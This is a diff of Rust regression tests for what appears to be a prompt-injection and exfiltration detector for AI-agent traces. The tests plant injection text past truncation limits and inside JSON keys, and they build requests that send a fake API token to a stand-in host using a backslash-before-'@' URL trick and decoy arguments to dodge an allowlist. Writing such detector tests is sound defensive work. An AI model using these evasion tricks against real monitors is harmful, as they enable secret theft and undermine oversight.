@@ -530,3 +530,150 @@ fn schema_1_0_events_still_parse() {
     assert_eq!(e.agent(), "main");
     assert!(e.context_event_ids.is_empty());
 }
+
+// Regression: content rules must see what the agent saw, not only the truncated copy
+// that is stored. Injection text placed after the 16 KiB per-string limit, or inside a
+// payload larger than the 256 KiB payload limit, used to produce no AT-001/AT-005.
+#[test]
+fn content_rules_see_text_beyond_truncation_limits() {
+    let padding = "Lorem ipsum dolor sit amet. ".repeat(700); // ~19 KiB
+    let late = format!("{padding}\nSYSTEM: {INJECTION}");
+
+    let mut b = Builder::new();
+    b.content(&late, TrustLevel::LowerTrust);
+    let (rec, f) = b.analyze();
+    assert_eq!(rec.events[0].metadata["truncated"], true);
+    assert!(f.iter().any(|f| f.rule_id == "AT-001"), "{f:?}");
+    assert!(f.iter().any(|f| f.rule_id == "AT-005"), "{f:?}");
+
+    // Whole payload above MAX_PAYLOAD_BYTES (replaced by a 4 KiB preview).
+    let mut b = Builder::new();
+    let chunks: Vec<Value> = (0..30).map(|_| Value::String("x".repeat(10_000))).collect();
+    b.r.record(
+        EventSpec::new(
+            EventKind::ToolResultReceived,
+            Origin::McpTool,
+            TrustLevel::LowerTrust,
+            "read_document",
+        )
+        .payload(json!({"tool": "read_document", "chunks": chunks, "tail": INJECTION})),
+    );
+    let (_, f) = b.analyze();
+    assert!(f.iter().any(|f| f.rule_id == "AT-001"), "{f:?}");
+
+    // Below the limits nothing changes, and benign padded text stays clean.
+    let mut b = Builder::new();
+    b.content(&padding, TrustLevel::LowerTrust);
+    assert!(b.analyze().1.is_empty());
+}
+
+// Regression: object keys are content too (structured tool results).
+#[test]
+fn content_rules_scan_object_keys() {
+    let mut b = Builder::new();
+    b.r.record(
+        EventSpec::new(
+            EventKind::ToolResultReceived,
+            Origin::McpTool,
+            TrustLevel::LowerTrust,
+            "lookup",
+        )
+        .payload(json!({"tool": "lookup", "structured_content": {INJECTION: 1}})),
+    );
+    let (_, f) = b.analyze();
+    assert!(f.iter().any(|f| f.rule_id == "AT-001"), "{f:?}");
+}
+
+// Imported indicator labels can only add findings; unknown labels are ignored.
+#[test]
+fn stored_indicator_labels_are_allowlisted() {
+    let mut b = Builder::new();
+    b.r.record(
+        EventSpec::new(
+            EventKind::ToolResultReceived,
+            Origin::McpTool,
+            TrustLevel::LowerTrust,
+            "read_document",
+        )
+        .payload(json!({"tool": "read_document", "content": "harmless"}))
+        .meta(
+            "content_indicators",
+            json!({"AT-001": ["\u{1b}[31mforged", "override_task"]}),
+        ),
+    );
+    let (_, f) = b.analyze();
+    let at001 = f.iter().find(|f| f.rule_id == "AT-001").expect("AT-001");
+    assert!(at001.description.contains("override_task"));
+    assert!(!at001.description.contains("forged"));
+}
+
+// Regression: AT-003 must not be silenced by a destination that only *looks* allowlisted
+// (backslash before `@`) or by an allowlisted decoy next to the real target argument.
+#[test]
+fn at003_not_silenced_by_parser_tricks_or_decoy_arguments() {
+    for args in [
+        json!({"url": "https://marker.invalid\\@localhost/x", "body": "token"}),
+        json!({"destination": "http://localhost/", "url": "https://marker.invalid/x"}),
+    ] {
+        let mut b = Builder::new();
+        // Untracked sensitive source, no lower-trust cause: AT-003 is the only signal.
+        let secret = b.r.record(
+            EventSpec::new(
+                EventKind::ToolResultReceived,
+                Origin::McpTool,
+                TrustLevel::Trusted,
+                "read_env",
+            )
+            .payload(json!({"content": "API_TOKEN=FAKE_SECRET_FOR_TESTING_ONLY"})),
+        );
+        b.request("http_request", args.clone(), Some(secret));
+        let (_, f) = b.analyze();
+        assert!(f.iter().any(|f| f.rule_id == "AT-003"), "{args}: {f:?}");
+    }
+}
+
+// Regression: every privileged/outbound request walked its whole ancestry, so a crafted
+// chain made analysis quadratic (32k events took minutes). Analysis must stay fast and the
+// findings for the chain must still be produced.
+#[test]
+fn long_causal_chains_are_analyzed_in_linear_time() {
+    let mut r = TraceRecorder::deterministic("chain", ExecutionMode::Live, "chain");
+    let mut prev = r.record(
+        EventSpec::new(
+            EventKind::ToolResultReceived,
+            Origin::McpTool,
+            TrustLevel::LowerTrust,
+            "read_document",
+        )
+        .payload(json!({"content": "API_TOKEN=FAKE_SECRET_FOR_TESTING_ONLY"})),
+    );
+    let n = 20_000;
+    for _ in 0..n {
+        prev = r.record(
+            EventSpec::new(
+                EventKind::ToolCallRequested,
+                Origin::Agent,
+                TrustLevel::Unknown,
+                "send_webhook_mock",
+            )
+            .payload(json!({"tool": "send_webhook_mock",
+                "arguments": {"destination": "https://marker.invalid/x"}}))
+            .caused_by(prev)
+            .tool_state(ToolState::Requested),
+        );
+    }
+    let rec = r.finish();
+    let start = std::time::Instant::now();
+    let f = Analyzer::default().analyze(&rec, rec.trace.created_at);
+    let elapsed = start.elapsed();
+    // Generous for slow CI runners and debug builds: the quadratic version needed more
+    // than six minutes for this chain even in a release build.
+    assert!(
+        elapsed < std::time::Duration::from_secs(60),
+        "took {elapsed:?}"
+    );
+    assert_eq!(f.iter().filter(|f| f.rule_id == "AT-002").count(), n);
+    assert_eq!(f.iter().filter(|f| f.rule_id == "AT-003").count(), n);
+    // Evidence stays bounded even for very long paths.
+    assert!(f.iter().all(|f| f.evidence_event_ids.len() <= 70));
+}
